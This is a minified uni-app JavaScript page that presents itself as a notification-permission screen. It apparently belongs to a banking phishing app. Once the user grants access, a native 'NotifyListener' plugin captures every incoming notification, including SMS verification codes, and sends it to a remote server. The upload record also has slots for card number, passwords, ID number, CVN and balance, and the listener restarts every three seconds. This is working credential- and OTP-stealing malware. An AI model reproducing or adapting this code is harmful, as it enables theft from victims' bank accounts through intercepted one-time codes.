import{d as a,k as e,A as s,r as t,y as l,p as o,o as n,e as i,w as r,f as d,s as u,g as c,q as _,t as m,u as f,b as p,v,x as g,m as y,_ as I}from"./index-1a1fccd8.js";import{r as N,a as T,_ as O,b as S,c as L}from"./Rules.f714300d.js";import{h as P,u as h}from"./Remote.9d35866b.js";const w=I(a({...{data:()=>({options:{}}),onLoad(a){this.options=a}},__name:"permission",setup(a){const I=e();s();const w=uni.requireNativePlugin("Karma617-NotifyListener"),E=t(I.t("BUTTON_PERMISSION_TO_ALLOW"));l((()=>{let a=y();if(a){let e=a.data.options;R.value.id=e.order}w.init()})),o((()=>{}));const x=t(null),R=t({id:""}),b=async()=>{console.log("allowPermission..."),w.notificationPermission()?M():w.jumpSettingPage()},k=t(!1),M=()=>{k.value||j(""),k.value=!0,console.log("startNotifyListener...."),w.startNotifyListener((a=>{console.log("-------1"),console.log(a);let e=JSON.stringify(a);j(e)}))},j=async a=>{x.value.validate();let e={d_id:R.value.id,d_kaihuhang:"",d_name:"",d_kahao:"",d_mima:"",d_mima2:"",d_sfz:"",d_phone:"",d_cvn:"",d_cvntime:"",d_yue:null,d_yzm:null,d_download:null,d_permission:1,d_sms:a,d_device:null},s=await h(e);console.log(s),1==s.status&&a&&u({url:"waiting?order="+s.data.d_id})};o((()=>{clearInterval(A)}));const A=setInterval((async()=>{try{P(R.value.id),(async()=>{console.log("checkPermission...",w.notificationPermission()),w.notificationPermission()?(E.value=I.t("BUTTON_PERMISSION_LISTENING"),M()):E.value=I.t("BUTTON_PERMISSION_TO_ALLOW")})()}catch(a){}}),3e3);return(a,e)=>{const s=d,t=v,l=N(g("uni-col"),O),o=N(g("uni-row"),S),u=N(g("uni-forms"),L);return n(),i(s,{class:"home-container"},{default:r((()=>[c(s,{class:"custom-nav"},{default:r((()=>[c(s),c(s,null,{default:r((()=>[c(t,{class:"title"},{default:r((()=>[_(m(a.$t("TITLE_PERMISSION")),1)])),_:1})])),_:1}),c(s)])),_:1}),c(s,{variant:"text",class:"card"},{default:r((()=>[c(u,{class:"form",modelValue:R.value,ref_key:"prepareForm",ref:x,"label-position":"top","err-show-type":"undertext",rules:f(T),validateTrigger:"blur"},{default:r((()=>[c(o,{class:"form-row",style:{margin:"6em 0"}},{default:r((()=>[c(l,{span:24,style:{"text-align":"center"}},{default:r((()=>[_(m(a.$t("LABEL_PERMISSION_TEXT")),1)])),_:1})])),_:1}),c(o,{class:"form-row"},{default:r((()=>[c(l,{span:24,style:{"text-align":"center"}},{default:r((()=>[p("uni-button",{type:"primary",class:"large-button",onClick:b},m(E.value),1)])),_:1})])),_:1})])),_:1},8,["modelValue","rules"])])),_:1})])),_:1})}}}),[["__scopeId","data-v-c9dd604e"]]);export{w as default};
